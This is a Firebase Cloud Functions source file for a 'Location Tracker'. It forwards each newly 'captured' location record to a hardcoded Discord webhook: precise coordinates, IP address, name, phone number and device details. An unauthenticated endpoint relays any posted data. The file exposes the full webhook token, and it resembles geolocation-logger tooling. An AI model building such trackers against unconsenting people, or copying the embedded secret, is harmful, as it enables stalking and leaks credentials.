const { onRequest } = require('firebase-functions/v2/https');
const { onValueCreated } = require('firebase-functions/v2/database');
const admin = require('firebase-admin');

admin.initializeApp();

// Discord webhook URL - hardcoded for simplicity
// For production, use Firebase secrets: https://firebase.google.com/docs/functions/config-env
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1550010848892944486/eezYf1HGQIgYLyPDEyMYFTpP088F_IAAA7f5JiJvxi-btm7JDfNugj-Y7H-MSSVl1cdS';

/**
 * Send Discord notification when new location is added to Firebase
 */
exports.onNewLocation = onValueCreated(
    { ref: '/locations/{locationId}', region: 'asia-southeast1' },
    async (event) => {
        const locationData = event.data.val();
        const locationId = event.params.locationId;
        console.log('New location received:', locationId);
        try {
            await sendDiscordNotification(locationData, 'New Location Captured');
        } catch (error) {
            console.error('Failed to send Discord notification:', error);
        }
    }
);

/**
 * HTTP endpoint to send test Discord notification
 */
exports.sendTestDiscord = onRequest({ cors: true }, async (req, res) => {
    try {
        const payload = {
            embeds: [{
                title: '✅ Location Tracker Connected',
                description: 'Discord notifications are working correctly.',
                color: 0x28a745,
                timestamp: new Date().toISOString()
            }],
            username: 'Location Tracker',
            avatar_url: 'https://maps.google.com/mapfiles/ms/icons/red-dot.png'
        };

        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (!response.ok) throw new Error(`Discord API error: ${response.status}`);
        res.status(200).json({ success: true, message: 'Test notification sent!' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

/**
 * HTTP endpoint to manually send Discord notification
 */
exports.sendDiscordNotificationHttp = onRequest({ cors: true }, async (req, res) => {
    if (req.method !== 'POST') {
        res.status(405).json({ error: 'Method not allowed' });
        return;
    }
    
    try {
        const locationData = req.body;
        if (!locationData) {
            res.status(400).json({ error: 'Location data required' });
            return;
        }
        await sendDiscordNotification(locationData, 'Location Alert');
        res.status(200).json({ success: true, message: 'Notification sent!' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

/**
 * Helper function to send formatted Discord notification
 */
async function sendDiscordNotification(locationData, title = '📍 New Location Captured') {
    const accuracy = locationData.accuracy ? `±${Math.round(locationData.accuracy)}m` : 'Unknown';
    const source = locationData.locationSource || 'Unknown';
    const timestamp = locationData.timestamp ? new Date(locationData.timestamp).toLocaleString() : 'Unknown';
    const userName = [locationData.firstName, locationData.lastName].filter(Boolean).join(' ') || 'Not provided';
    const phone = locationData.phone || 'Not provided';
    const browser = locationData.browser?.name || 'Unknown';
    const browserVersion = locationData.browser?.version || '';
    const platform = locationData.device?.platform || 'Unknown';
    const mapsLink = locationData.latitude && locationData.longitude
        ? `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`
        : null;

    let color = 0x808080;
    if (locationData.accuracy) {
        if (locationData.accuracy < 50) color = 0x28a745;
        else if (locationData.accuracy < 200) color = 0x8bc34a;
        else if (locationData.accuracy < 1000) color = 0xffc107;
        else color = 0xff5722;
    }

    const embed = {
        title: `📍 ${title}`,
        color: color,
        fields: [
            { name: '👤 User', value: `${userName}\n📱 ${phone}`, inline: true },
            { name: '🌐 IP', value: `\`${locationData.ip || 'Unknown'}\``, inline: true },
            { name: '🎯 Accuracy', value: `${accuracy} (${source})`, inline: true },
            { name: '📍 Coords', value: locationData.latitude ? `${Number(locationData.latitude).toFixed(6)}, ${Number(locationData.longitude).toFixed(6)}` : 'N/A', inline: true },
            { name: '🖥️ Device', value: `${browser} ${browserVersion}\n${platform}`, inline: true },
            { name: '⏰ Time', value: timestamp, inline: true }
        ],
        footer: { text: `Status: ${locationData.status || 'active'}` },
        timestamp: new Date().toISOString()
    };

    if (mapsLink) {
        embed.fields.push({ name: '🗺️ Map', value: `[Google Maps](${mapsLink})` });
    }

    const payload = {
        embeds: [embed],
        username: 'Location Tracker',
        avatar_url: 'https://maps.google.com/mapfiles/ms/icons/red-dot.png'
    };

    const response = await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });

    if (!response.ok) {
        throw new Error(`Discord API error: ${response.status}`);
    }
    return true;
}
